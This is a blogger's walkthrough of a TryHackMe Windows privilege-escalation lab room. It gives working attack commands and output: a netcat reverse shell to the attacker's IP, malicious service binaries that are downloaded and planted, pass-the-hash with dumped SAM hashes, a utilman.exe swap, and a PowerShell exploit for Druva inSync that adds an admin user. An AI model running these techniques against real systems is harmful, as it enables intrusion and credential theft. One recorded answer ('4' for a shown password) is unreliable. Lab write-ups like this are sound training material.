---
title: Windows Privilege Escalation
author: CYB3RM3
name: CYB3RM3 | Windows Privilege Escalation 
date: 2022-09-03 16:50:09 +0100
categories: [TryHackMe, Post Compromise]
tags: [Privesc, Windows]
---

Learn the fundamentals of Windows privilege escalation techniques.

THM Room [https://tryhackme.com/room/windowsprivesc20](https://tryhackme.com/room/windowsprivesc20)


## TASK 1 : Introduction
### Click and continue learning! 
No Answer

## TASK 2 : Windows Privilege Escalation 
### Users that can change system configurations are part of which group? 

![Administrators](/images/thm/windowsprivesc20/windowsprivesc20_1.png)
_Administrators_

Answer : Administrators

### The SYSTEM account has more privileges than the Administrator user (aye/nay)

![SYSTEM](/images/thm/windowsprivesc20/windowsprivesc20_2.png)
_SYSTEM_

Answer : AYE

## TASK 3 : Harvesting Passwords from Usual Spots
###  A password for the julia.jones user has been left on the Powershell history. What is the password? 
Using the command for  retreive the consoleHost_history file : 

```console
C:\Users\thm-unpriv>type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
ls
whoami
whoami /priv
whoami /group
whoami /groups
cmdkey /?
cmdkey /add:thmdc.local /user:julia.jones /pass:ZuperCkretPa5z
cmdkey /list
cmdkey /delete:thmdc.local
cmdkey /list
runas /?
type $?ènv:userprofile\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
exit
type $?ènv:julia.jones\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type $?ènv:thm-unpriv\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type $?ènv:userprofile\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
cls
exit

C:\Users\thm-unpriv>
```
{: .nolineno }

Answer : ZuperCkretPa5z

### A web server is running on the remote host. Find any interesting password on web.config files associated with IIS. What is the password of the db_admin user?

![web.config](/images/thm/windowsprivesc20/windowsprivesc20_3.png)
_web.config_

Answer : 098n0x35skjD3

### There is a saved password on your Windows credentials. Using cmdkey and runas, spawn a shell for mike.katz and retrieve the flag from his desktop.

First we need to list the saved credentials :

```console
C:\Users\thm-unpriv>cmdkey /list

Currently stored credentials:

   Target: Domain:interactive=WPRIVESC1\mike.katz
   Type: Domain Password
   User: WPRIVESC1\mike.katz
```
{: .nolineno }

Then we can use the saved credential tu do spawn a shell with Mike's context :

![Listed creds](/images/thm/windowsprivesc20/windowsprivesc20_4.png)
_Listed creds_

Finally, we can cd to the desktop to view the flag file :

```console
Microsoft Windows [Version 10.0.17763.1821]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
wprivesc1\mike.katz

C:\Windows\system32>cd /Users/mike.katz/Desktop

C:\Users\mike.katz\Desktop>dir
 Volume in drive C has no label.
 Volume Serial Number is A8A4-C362

 Directory of C:\Users\mike.katz\Desktop

05/04/2022  05:17 AM    <DIR>          .
05/04/2022  05:17 AM    <DIR>          ..
06/21/2016  03:36 PM               527 EC2 Feedback.website
06/21/2016  03:36 PM               554 EC2 Microsoft Windows Guide.website
05/04/2022  05:17 AM                24 flag.txt
               3 File(s)          1,105 bytes
               2 Dir(s)  15,034,159,104 bytes free

C:\Users\mike.katz\Desktop>type flag.txt
THM{WHAT_IS_MY_PASSWORD}
C:\Users\mike.katz\Desktop>
```
{: .nolineno }

Answer : THM{WHAT_IS_MY_PASSWORD}

### Retrieve the saved password stored in the saved PuTTY session under your profile. What is the password for the thom.smith user?

We can query the registry :

```console
C:\Users\thm-unpriv>reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f "Proxy" /s

HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\My%20ssh%20server
    ProxyExcludeList    REG_SZ
    ProxyDNS    REG_DWORD    0x1
    ProxyLocalhost    REG_DWORD    0x0
    ProxyMethod    REG_DWORD    0x0
    ProxyHost    REG_SZ    proxy
    ProxyPort    REG_DWORD    0x50
    ProxyUsername    REG_SZ    thom.smith
    ProxyPassword    REG_SZ    CoolPass2021
    ProxyTelnetCommand    REG_SZ    connect %host %port\n
    ProxyLogToTerm    REG_DWORD    0x1

End of search: 10 match(es) found.

C:\Users\thm-unpriv>
```
{: .nolineno }

Answer : 4

## TASK 4 : Other Quick Wins 
### What is the taskusr1 flag? 
Applying the method :

```console
C:\Users\thm-unpriv>schtasks | findstr "vuln"
vulntask                                 N/A                    Ready

C:\Users\thm-unpriv>schtasks /query /tn vulntask /fo list /v

Folder: \
HostName:                             WPRIVESC1
TaskName:                             \vulntask
Next Run Time:                        N/A
Status:                               Ready
Logon Mode:                           Interactive/Background
Last Run Time:                        9/3/2022 11:13:13 AM
Last Result:                          0
Author:                               WPRIVESC1\Administrator
Task To Run:                          C:\tasks\schtask.bat
Start In:                             N/A
Comment:                              N/A
Scheduled Task State:                 Enabled
Idle Time:                            Disabled
Power Management:                     Stop On Battery Mode, No Start On Batteries
Run As User:                          taskusr1
Delete Task If Not Rescheduled:       Disabled
Stop Task If Runs X Hours and X Mins: 72:00:00
Schedule:                             Scheduling data is not available in this format.
Schedule Type:                        At system start up
Start Time:                           N/A
Start Date:                           N/A
End Date:                             N/A
Days:                                 N/A
Months:                               N/A
Repeat: Every:                        N/A
Repeat: Until: Time:                  N/A
Repeat: Until: Duration:              N/A
Repeat: Stop If Still Running:        N/A

C:\Users\thm-unpriv>whoami
wprivesc1\thm-unpriv
```
{: .nolineno }

Then Overwrite the file and run a listener on the attacker machine :

```console
echo c:\tools\nc64.exe -e cmd.exe 10.10.58.45 4444 > C:\tasks\schtask.bat
```
{: .nolineno }

![Task scheduler exploit](/images/thm/windowsprivesc20/windowsprivesc20_5.png)
_Task scheduler exploit_

We can now start the task and a shell spawn on our attacker machine :

![Reverse shell](/images/thm/windowsprivesc20/windowsprivesc20_6.png)
_Reverse shell_

Finally, we can find the flag :

```console
C:\Windows\system32>cd /Users/taskusr1/Desktop      
cd /Users/taskusr1/Desktop

C:\Users\taskusr1\Desktop>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is A8A4-C362

 Directory of C:\Users\taskusr1\Desktop

05/03/2022  01:00 PM    <DIR>          .
05/03/2022  01:00 PM    <DIR>          ..
06/21/2016  03:36 PM               527 EC2 Feedback.website
06/21/2016  03:36 PM               554 EC2 Microsoft Windows Guide.website
05/03/2022  01:00 PM                19 flag.txt
               3 File(s)          1,100 bytes
               2 Dir(s)  15,032,233,984 bytes free

C:\Users\taskusr1\Desktop>type flag.txt
type flag.txt
THM{TASK_COMPLETED}
C:\Users\taskusr1\Desktop>
```
{: .nolineno }

Answer : THM{TASK_COMPLETED}

## TASK 5 : Abusing Service Misconfigurations 
### Get the flag on svcusr1's desktop. 
First we need to check the service properties and permissions :

```console
C:\Users\thm-unpriv>sc qc WindowsScheduler
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: WindowsScheduler
        TYPE               : 10  WIN32_OWN_PROCESS
        START_TYPE         : 2   AUTO_START
        ERROR_CONTROL      : 0   IGNORE
        BINARY_PATH_NAME   : C:\PROGRA~2\SYSTEM~1\WService.exe
        LOAD_ORDER_GROUP   :
        TAG                : 0
        DISPLAY_NAME       : System Scheduler Service
        DEPENDENCIES       :
        SERVICE_START_NAME : .\svcusr1

C:\Users\thm-unpriv>icacls C:\PROGRA~2\SYSTEM~1\WService.exe
C:\PROGRA~2\SYSTEM~1\WService.exe Everyone:(I)(M)
                                  NT AUTHORITY\SYSTEM:(I)(F)
                                  BUILTIN\Administrators:(I)(F)
                                  BUILTIN\Users:(I)(RX)
                                  APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES:(I)(RX)
                                  APPLICATION PACKAGE AUTHORITY\ALL RESTRICTED APPLICATION PACKAGES:(I)(RX)

Successfully processed 1 files; Failed processing 0 files
```
{: .nolineno }

We can now create an malicious executable to get a reverse shell with msfvenom :

![Malicious Payload](/images/thm/windowsprivesc20/windowsprivesc20_7.png)
_Malicious Payload_

Then upload it on the target machine. On attacker : 

```console
Python3 http.server
```
{: .nolineno }

On target we can retreive the executable and move it on the right place by changing its name to impersonate the original service executable :

```console
C:\Users\thm-unpriv>powershell
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\Users\thm-unpriv\Desktop> ls


    Directory: C:\Users\thm-unpriv\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----         5/4/2022   8:15 AM           1387 ProcessHacker.lnk


PS C:\Users\thm-unpriv\Desktop> wget http://10.10.58.45:8000/rev-svc.exe -O rev-svc.exe
PS C:\Users\thm-unpriv\Desktop> ls


    Directory: C:\Users\thm-unpriv\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----         5/4/2022   8:15 AM           1387 ProcessHacker.lnk
-a----         9/3/2022  12:35 PM          48640 rev-svc.exe


PS C:\Users\thm-unpriv\Desktop> move C:\PROGRA~2\SYSTEM~1\WService.exe C:\PROGRA~2\SYSTEM~1\WService.exe.bkp
PS C:\Users\thm-unpriv\Desktop> move .\rev-svc.exe C:\PROGRA~2\SYSTEM~1\WService.exe
PS C:\Users\thm-unpriv\Desktop> ls C:\PROGRA~2\SYSTEM~1\ | findstr "rev"
-a----         9/3/2022  12:35 PM          48640 rev-svc.exe
PS C:\Users\thm-unpriv\Desktop> move C:\PROGRA~2\SYSTEM~1\rev-svc.exe C:\PROGRA~2\SYSTEM~1\Wservice.exe
PS C:\Users\thm-unpriv\Desktop> ls C:\PROGRA~2\SYSTEM~1\ | findstr "Wservice"
-a----         9/3/2022  12:35 PM          48640 Wservice.exe
```
{: .nolineno }

We can grant full permission for everyone :

![Grant Permissions](/images/thm/windowsprivesc20/windowsprivesc20_8.png)
_Grant Permissions_

Now by restarting the service, we gain a shell on our attacker machine  :

![Reverse shell](/images/thm/windowsprivesc20/windowsprivesc20_9.png)
_Reverse shell_

Last, let's go to the flag :

```console
C:\Windows\system32>cd /Users/svcusr1/Desktop
cd /Users/svcusr1/Desktop

C:\Users\svcusr1\Desktop>type flag.txt
type flag.txt
THM{AT_YOUR_SERVICE}
```
{: .nolineno }

Answer : THM{AT_YOUR_SERVICE}

### Get the flag on svcusr2's desktop.

For this flag, we'll exploit a "Unquoted Service Paths" vulnerability.

We can generate the same malicious executable than the previous question, upload it again and start a listener on attacker machine :

![Malicious executable](/images/thm/windowsprivesc20/windowsprivesc20_10.png)
_Malicious executable_

After finding a vulnerable "Unquoted Service Paths" to exploit, we can copy our malicious executable and rename it at the same place as the folder we found :

![Move malicious executable](/images/thm/windowsprivesc20/windowsprivesc20_11.png)
_Move malicious executable_

Restarting the service should give us a shell :

![Reverse shell](/images/thm/windowsprivesc20/windowsprivesc20_12.png)
_Reverse shell_

Now we got the shell, we can print the flag's content :

```console
root@ip-10-10-58-45:~# nc -lnvp 4445
Listening on [0.0.0.0] (family 0, port 4445)
Connection from 10.10.40.161 49904 received!
Microsoft Windows [Version 10.0.17763.1821]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
wprivesc1\svcusr2

C:\Windows\system32>cd /Users/svcusr2/Desktop
cd /Users/svcusr2/Desktop

C:\Users\svcusr2\Desktop>type flag.txt
type flag.txt
THM{QUOTES_EVERYWHERE}
C:\Users\svcusr2\Desktop>
```
{: .nolineno }

Answer : THM{QUOTES_EVERYWHERE}

### Get the flag on the Administrator's desktop.

For this question, we'll exploit "Insecure Service Permissions" .

Let's first use "Accesschk64.exe" from the sysinternals suite tu view the DACL (Discretionary Access Control Lists) on our thmservice :

![Permissions](/images/thm/windowsprivesc20/windowsprivesc20_13.png)
_Permissions_

We need to grant permission to our malicious executable :

```console
C:\Users\thm-unpriv\Desktop>dir
 Volume in drive C has no label.
 Volume Serial Number is A8A4-C362

 Directory of C:\Users\thm-unpriv\Desktop

09/03/2022  01:14 PM    <DIR>          .
09/03/2022  01:14 PM    <DIR>          ..
05/04/2022  08:15 AM             1,387 ProcessHacker.lnk
09/03/2022  01:14 PM            48,640 rev-svc.exe
09/03/2022  12:46 PM                18 start
09/03/2022  12:46 PM                18 stop
               4 File(s)         50,063 bytes
               2 Dir(s)  15,046,438,912 bytes free

C:\Users\thm-unpriv\Desktop>icacls rev-svc.exe /grant Everyone:F
processed file: rev-svc.exe
Successfully processed 1 files; Failed processing 0 files
```
{: .nolineno }

Now we can reconfigure the vulnerable "thmservice" :

```console
sc config THMService binPath= "C:\Users\thm-unpriv\rev-svc.exe" obj= LocalSystem
```
{: .nolineno }

Then after restarting the service, we get the reverse shell in our listener :

![Privesc](/images/thm/windowsprivesc20/windowsprivesc20_14.png)
_Privesc_

The flag on the desktop is : 

```console
C:\Users>cd Administrator/Desktop
cd Administrator/Desktop

C:\Users\Administrator\Desktop>type flag.txt
type flag.txt
THM{INSECURE_SVC_CONFIG}
```
{: .nolineno }

Answer : THM{INSECURE_SVC_CONFIG}

## TASK 6 : Abusing dangerous privileges 
### Get the flag on the Administrator's desktop - SeBackup.

We will abuse the "SeBackup / SeRestore" privileges.

Fisrt, check the privilege on our target :

![Check privilege](/images/thm/windowsprivesc20/windowsprivesc20_15.png)
_Check privilege_

Then :

![Copy hive](/images/thm/windowsprivesc20/windowsprivesc20_16.png)
_Copy hive_

Then :

![Share](/images/thm/windowsprivesc20/windowsprivesc20_17.png)
_Share_

We can now use impacket to get administrator's hash :

```console
root@ip-10-10-58-45:~/share# python3.9 /opt/impacket/examples/secretsdump.py -sam sam.hive -system system.hive LOCAL
Impacket v0.10.1.dev1+20220606.123812.ac35841f - Copyright 2022 SecureAuth Corporation

[*] Target system bootKey: 0x36c8d26ec0df8b23ce63bcefa6e2d821
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:8f81ee5558e2d1205a84d07b0e3b34f5:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:58f8e0214224aebc2c5f82fb7cb47ca1:::
THMBackup:1008:aad3b435b51404eeaad3b435b51404ee:6c252027fb2022f5051e854e08023537:::
THMTakeOwnership:1009:aad3b435b51404eeaad3b435b51404ee:0af9b65477395b680b822e0b2c45b93b:::
[*] Cleaning up... 
root@ip-10-10-58-45:~/share
```
{: .nolineno }

And finally use the impacket pass-the-hash to prompt a system shell :

```console
python3.9 /opt/impacket/examples/psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:8f81ee5558e2d1205a84d07b0e3b34f5 administrator@10.10.137.58
```
{: .nolineno }

![Privesc](/images/thm/windowsprivesc20/windowsprivesc20_18.png)
_Privesc_

And lastly the flag is :

```console
C:\Windows\system32> cd /Users/Administrator/Desktop

C:\Users\Administrator\Desktop> type flag.txt
THM{SEFLAGPRIVILEGE}
```
{: .nolineno }

Answer : THM{SEFLAGPRIVILEGE}

### Get the flag on the Administrator's desktop - SeTakeOwnership

We can also abuse "SeTakeOwnership" to get an system shell in this case on "utilman.exe":

First let's take ownership on utilman.exe and grant us full permission :

![Privilege](/images/thm/windowsprivesc20/windowsprivesc20_19.png)
_Privilege_

![takeown](/images/thm/windowsprivesc20/windowsprivesc20_20.png)
_takeown_

Then replace the utilman.exe file by a cmd.exe copy :

![utilman.exe](/images/thm/windowsprivesc20/windowsprivesc20_21.png)
_utilman.exe_

Wew can now trigger utilman.exe from locking the session and clicking the "ease of access" button to get the system shell :

![Privesc](/images/thm/windowsprivesc20/windowsprivesc20_22.png)
_Privesc_

From here, we can read the flag on the administrator's desktop :

```console
C:\Windows\system32> cd /Users/Administrator/Desktop

C:\Users\Administrator\Desktop> type flag.txt
THM{SEFLAGPRIVILEGE}
```
{: .nolineno }

Answer : THM{SEFLAGPRIVILEGE}

## TASK 7 : Abusing vulnerable software 
###  Get the flag on the Administrator's desktop. 
Here's the exploit code :

```powershell
$ErrorActionPreference = "Stop"

$cmd = "net user pwnd SimplePass123 /add & net localgroup administrators pwnd /add"

$s = New-Object System.Net.Sockets.Socket(
    [System.Net.Sockets.AddressFamily]::InterNetwork,
    [System.Net.Sockets.SocketType]::Stream,
    [System.Net.Sockets.ProtocolType]::Tcp
)
$s.Connect("127.0.0.1", 6064)

$header = [System.Text.Encoding]::UTF8.GetBytes("inSync PHC RPCW[v0002]")
$rpcType = [System.Text.Encoding]::UTF8.GetBytes("$([char]0x0005)`0`0`0")
$command = [System.Text.Encoding]::Unicode.GetBytes("C:\ProgramData\Druva\inSync4\..\..\..\Windows\System32\cmd.exe /c $cmd");
$length = [System.BitConverter]::GetBytes($command.Length);

$s.Send($header)
$s.Send($rpcType)
$s.Send($length)
$s.Send($command)
```
{: .nolineno }

After executing this in powershell, we can check the membership of our new added user :

![Pwnd](/images/thm/windowsprivesc20/windowsprivesc20_23.png)
_Pwnd_

Since he's member of *Administrator group, we can use this account to read the administrator flag :

![Flag](/images/thm/windowsprivesc20/windowsprivesc20_24.png)
_Flag_

Answer : THM{EZ_DLL_PROXY_4ME}

## TASK 8 : Tools of the Trade 
### Click and continue learning! 
No Answer.

## TASK 9 : Conclusion 
### Click and continue learning! 
No Answer.
